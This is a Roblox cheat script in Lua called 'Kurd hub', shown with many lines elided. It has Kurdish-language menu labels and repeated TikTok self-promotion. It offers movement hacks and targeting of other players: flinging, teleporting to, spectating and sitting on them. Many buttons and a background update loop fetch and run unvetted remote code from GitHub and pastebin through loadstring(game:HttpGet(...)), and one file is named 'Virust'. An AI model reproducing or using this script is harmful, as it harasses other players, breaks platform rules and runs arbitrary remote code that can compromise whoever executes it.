if game.CoreGui:FindFirstChild("kurd hub") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Script",Text = "kurd hub",Duration = 15;})
	return
end
local version = 2
--VARIABLES
...
TitleBarLabel.Text = "__________//KURD HUB\\\_________"
...
Home_Section_Button.Text = "زانیاری"
...
Game_Section_Button.Text = "هاک v1"
...
Character_Section_Button.Text = "هاک v2"
...
Target_Section_Button.Text = "هاکی خەڵک"
...
Animations_Section_Button.Text = "هاکئ یاریەکان"
...
Misc_Section_Button.Text = "هاک v3"
...
Credits_Section_Button.Text = "دروستکەر"
...
AntiRagdoll_Button.Text = "بینینی priv"
...
SpamMines_Button.Text = "tiktok: x6iu1"
...
PushAura_Button.Text = "خوشاردنەوە"
...
BreakCannons_Button.Text = "ئەیم بوت/لوک"
...
LethalCannons_Button.Text = "فرینی سەیارە"
...
ChatAlert_Button.Text = "حەرەکەکان"
...
VoidProtection_Button.Text = "فۆنت"
...
PushAll_Button.Text = "پوش کردنی هەموان"
...
TouchFling_Button.Text = "خو کوشتن"
...
CMDBar.PlaceholderText = "شوێنی شارەوە"
CMDBar.Text = ""
...
MinefieldTP_Button.Text = "شوێن 4"
...
NormalStairsTP_Button.Text = "شوێن 6"
...
MovingStairsTP_Button.Text = "شوێن 7"
...
SpiralStairsTP_Button.Text = "شوێن 8"
...
SkyscraperTP_Button.Text = "شوێن 9"
...
FreePushTool_Button.Text = "چەکی پوش کردن"
...
Welcome_Label.Text = ("سڵاو @"..plr.Name.."\n")
...
Announce_Label.Text = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/main/Info"))()
...
WalkSpeed_Input.PlaceholderText = "ژمارە [ 1 - 999999 ]"
...
ClearCheckpoint_Button.Text = "سڕینەوە"
...
JumpPower_Input.PlaceholderText = "ژمارە [ 1 - 999999 ]"
...
SaveCheckpoint_Button.Text = "سەیڤ"
...
Respawn_Button.Text = "شوێن گورین بەدەست"
...
FlySpeed_Button.Text = "خێرای فڕین"
...
FlySpeed_Input.PlaceholderText = "ژمارە [ 1 - 999999 ]"
FlySpeed_Input.Text = ""
...
TargetName_Input.PlaceholderText = "@یوزەری کەسەکە بنوسە بە پیتی بچوکی ئینگلیزی"
...
ViewTarget_Button.Text = "چاودێری"
...
FlingTarget_Button.Text = "فراندنی"
...
FocusTarget_Button.Text = "سەر و خوارەوه"
...
WhitelistTarget_Button.Text = "لیستی سپی"
...
TeleportTarget_Button.Text = "بڕویتە لای"
...
HeadsitTarget_Button.Text = "دانیشتن لەسەر سەری"
...
StandTarget_Button.Text = "پەیکەر"
...
BackpackTarget_Button.Text = "چانتا"
...
VampireAnim_Button.Text = "Blade ball"
...
AntiFling_Button.Text = "korblox headless"
...
AntiChatSpy_Button.Text = "سکریپت mm2"
...
Explode_Button.Text = "لەناو دیوار بڕوی"
...
Rejoin_Button.Text = "دوبارە کردنی سێرفەر"
...
InfYield_Button.Text = "سکریپت v2"
...
Credits_Label.Text = "وەک هاوکاریێک سکریپتەکه بو هاورێ کانتان بنێرن بو ئەوەی بەردەوام بین له سکریپتەکە و شتی جوانتر زیادکەین . فولوی تیک توکم بکەن \nTiktok: x6iu1\nVersion: "..version
...
local function UpdateTarget(player)
	pcall(function()
		if table.find(ForceWhitelist,player.UserId) then
			SendNotify("Script","هەڵەیە: @"..player.Name.." / "..player.DisplayName,5)
			player = nil
		end
	end)
	if (player ~= nil) then
		...
		UserIDTargetLabel.Text = ("ئایدی: "..player.UserId.."\nناو: "..player.DisplayName.."\nتاریخ: "..os.date("%d-%m-%Y", os.time()-player.AccountAge * 24 * 3600).." [هەفتە/مانگ/ساڵ]")
		TargetImage.Image = Players:GetUserThumbnailAsync(player.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
	else
		TargetName_Input.Text = "@یوزەرەکەی"
		UserIDTargetLabel.Text = "ئایدی: \nناو: \nتاریخ: "
		TargetImage.Image = "rbxassetid://10818605405"
		TargetedPlayer = nil
...
ChatAlert_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/GwceqKZU'))()
end)
...
CMDBar.FocusLost:Connect(function()
	...
	SendNotify("Script",("tiktok : x6iu1 "..command),5)
	CMDBar.Text = ""
end)
...
WalkSpeed_Button.MouseButton1Click:Connect(function()
	pcall(function()
		...
		SendNotify("Script","tiktok : x6iu1",5)
	end)
end)
...
Respawn_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Saman2034/1/main/telep.txt'))()
end)
...
WhitelistTarget_Button.MouseButton1Click:Connect(function()
	if TargetedPlayer ~= nil then
		if table.find(ScriptWhitelist, Players[TargetedPlayer].UserId) then
			...
			SendNotify("Script",TargetedPlayer.." ",5)
		else
...
VampireAnim_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Saman2034/1/main/bypas.lua'))()
end)



HeroAnim_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Ninja10908/S4/main/Virust'))()
end)
...
Day_Button.MouseButton1Click:Connect(function()
	if Shaders_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0) then
		...
		SendNotify("Script","tiktok : x6iu1",10)
	end
end)
...
AntiRagdoll_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Saman2034/1/main/priv3337.lua'))()
end)
...
InfYield_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/iMgUE4st'))()
end)
...
LethalCannons_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Ninja10908/S4/main/vflymobile.txt'))()
end)
...
CMDX_Button.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Saman2034/1/main/chatfake3366.lua",true))()
end)

Explode_Button.MouseButton1Click:Connect(function()
	if not ExplodeEnabled then
		ExplodeEnabled = true
		SendNotify("Script","دیـوار.\ntiktok: x6iu1")
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Saman2034/1/main/dewar3373.lua"))()
	end
end)
...
Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		if player.Name == TargetedPlayer then
			UpdateTarget(nil)
			SendNotify("Script","لێفتی کرد",10)
		end
	end)
end)
...
plr.CharacterAdded:Connect(function(x)
	...
	if SpamMines_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(SpamMines_Button)
		SendNotify("Script","tiktk : x6iu1",5)
	end
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(Fly_Button)
		flying = false
		...
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		SendNotify("Script","x6iu1 : tiktok",5)
	end
	...
	if ammount == original_ammount then
		...
		if not (count == original_ammount) then
			SysBroker:Destroy()
			SendNotify("Script","tiktk : x6iu1")
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
		end
	else
		SysBroker:Destroy()
		SendNotify("Script","tiktok : x6iu1")
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
	end
	appearance:Destroy()
end)
...
task.spawn(function()
	while task.wait(10) do
		pcall(function()
			local GuiVersion = loadstring(game:HttpGet("https://pastebin.com/raw/xCSGen4S"))()
			if version<GuiVersion then
				SendNotify("Script","tiktik : x6iu1",5)
				task.wait(5)
				SysBroker:Destroy()
				game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
			end
